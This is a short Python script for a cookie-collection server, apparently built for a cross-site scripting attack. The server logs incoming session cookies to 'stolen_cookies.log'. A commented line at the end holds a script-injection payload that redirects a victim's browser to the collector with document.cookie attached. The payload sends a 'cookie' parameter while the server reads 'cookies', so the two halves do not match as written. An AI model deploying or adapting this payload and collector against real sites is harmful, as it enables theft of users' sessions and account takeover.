from http.server import SimpleHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
from datetime import datetime
import urllib.parse

PORT = 8000

class AttackerHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        query = urlparse(self.path).query
        params = parse_qs(query)
        
        if 'cookies' in params:
            # Decode the URL-encoded cookies
            cookie_data = urllib.parse.unquote(params['cookies'][0])
            
            # Split into individual cookies
            cookies = cookie_data.split('; ')
            
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            log_entry = f"[{timestamp}] Received cookies:\n"
            
            for cookie in cookies:
                log_entry += f"  • {cookie}\n"
            
            print(log_entry)
            with open('stolen_cookies.log', 'a') as f:
                f.write(log_entry)
        
        self.send_response(200)
        self.end_headers()

print(f"Attacker server running on http://localhost:{PORT}")
print("Waiting for stolen cookies... (Ctrl+C to stop)")
HTTPServer(('', PORT), AttackerHandler).serve_forever()
                                                        





#'><script>alert('Stealing cookie: '+document.cookie); location.href='http://localhost:8000/?cookie='+document.cookie</script>
